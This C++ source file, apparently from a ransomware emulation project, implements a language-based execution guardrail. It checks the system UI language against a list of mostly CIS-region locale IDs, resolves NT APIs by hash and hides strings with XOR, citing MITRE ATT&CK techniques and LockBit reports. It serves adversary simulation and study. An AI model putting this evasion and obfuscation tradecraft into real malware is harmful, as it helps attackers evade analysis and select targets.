#include "crypto/xor_obfuscation.hpp"
#include "guardrails.hpp"
#include "logger.hpp"
#include "util/winapihelper.hpp"
#include <format>

namespace guardrails {

// Reference: https://learn.microsoft.com/en-us/windows/win32/msi/localizing-the-error-and-actiontext-tables
// Reference: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/70feba9f-294e-491e-b6eb-56532684c37f
std::set<LANGID> _exclusion_set = {
    0x2801, // ar-SY - Arabic (Syria)
    0x0819, // ru-MD - Russian (Moldova)
    0x042B, // hy-AM - Armenian (Armenia)
    0x0419, // ru-RU - Russian (Russia)
    0x742C, // az-Cyrl - Azerbaijani (Cyrillic Azerbaijani)
    0x0428, // tg-Cyrl-TJ - Tajik (Cyrillic Tajikistan)
    0x782C, // az-Latn - Azerbaijani (Latin Azerbaijani)
    0x042C, // az-Latn-AZ - Azerbaijani (Latin Azerbaijani (Azerbaijan))
    0x0442, // tk-TM - Turkmenistan (Turkmenistan)
    0x0423, // be-BY - Belarusian (Belarus)
    0x0444, // tt-RU - Tatar (Russia)
    0x0437, // ka-GE - Georgian (Georgia)
    0x0422, // uk-UA - Ukrainian (Ukraine)
    0x043F, // kk-KZ - Kazakh (Kazakhstan)
    0x0843, // uz-Cyrl-UZ - Uzbek (Cyrillic Uzbekistan)
    0x0440, // ky-KG - (Kyrgyzstan)
    0x0443, // uz-Latn-UZ - Uzbek (Latin Uzbekistan)
    0x0818, // ro-MD - Romanian (Moldova)
};

std::set<LANGID> GetDefaultLanguageExclusionSet() {
    return guardrails::_exclusion_set;
}

/*
 * SystemHasExcludedLang:
 *      About:
 *          Returns true if the system language appears in the lang_filter_list, false otherwise.
 *          If the function cannot check the system language for whatever reason, it will log
 *          an error message and return false.
 *          Language infromation is obtained using the NtQueryInstallUILanguage and NtQueryDefaultUILanguage
 *          API calls.
 *      Result:
 *          True if the system install UI or default UI languages are in the provided exclusion list,
 *          false otherwise or if the function cannot retrieve the languagae IDs.
 *      MITRE ATT&CK Techniques:
 *          T1614.001: System Location Discovery: System Language Discovery
 *          T1480: Execution Guardrails
 *          T1106: Native API
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 */
bool SystemHasExcludedLang(const std::set<LANGID>& lang_filter_list) {
    // Get system language IDs
    LANGID install_ui_lang_id;
    LANGID default_ui_lang_id;
    DWORD error_code;
    FP_NtQueryInstallUILanguage p_NtQueryInstallUILanguage = (FP_NtQueryInstallUILanguage)winapi_helper::GetAPI(
        0x7ac44b76, 
        XOR_WIDE_LIT(L"ntdll.dll"), 
        &error_code
    );
    if (p_NtQueryInstallUILanguage == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for NtQueryInstallUILanguage. Error code"), error_code));
        return false;
    }
    FP_NtQueryDefaultUILanguage p_NtQueryDefaultUILanguage = (FP_NtQueryDefaultUILanguage)winapi_helper::GetAPI(
        0xdc921ae4,
        XOR_WIDE_LIT(L"ntdll.dll"),
        &error_code
    );
    if (p_NtQueryDefaultUILanguage == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for NtQueryDefaultUILanguage. Error code"), error_code));
        return false;
    }
    NTSTATUS result = p_NtQueryInstallUILanguage(&install_ui_lang_id);
    if (result != STATUS_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to query install UI language. NTSTATUS"), result));
        return false;
    }
    XorLogger::LogDebug(std::format("{}: {:#04x}", XOR_LIT("Found install UI language ID"), install_ui_lang_id));
    result = p_NtQueryDefaultUILanguage(&default_ui_lang_id);
    if (result != STATUS_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to query default UI language. NTSTATUS"), result));
        return false;
    }
    XorLogger::LogDebug(std::format("{}: {:#04x}", XOR_LIT("Found default UI language ID"), default_ui_lang_id));
    if (lang_filter_list.contains(install_ui_lang_id)) {
        XorLogger::LogInfo(std::format("{} {:#04x} {}.", XOR_LIT("System install UI language ID"), install_ui_lang_id, XOR_LIT("is in the exclusion list")));
        return true;
    } else if (lang_filter_list.contains(default_ui_lang_id)) {
        XorLogger::LogInfo(std::format("{} {:#04x} {}.", XOR_LIT("System default UI language ID"), default_ui_lang_id, XOR_LIT("is in the exclusion list")));
        return true;
    } else {
        XorLogger::LogInfo(XOR_LIT("Neither the system install UI language ID nor the default UI language ID are in the exclusion list."));
        return false;
    }
}

} // namespace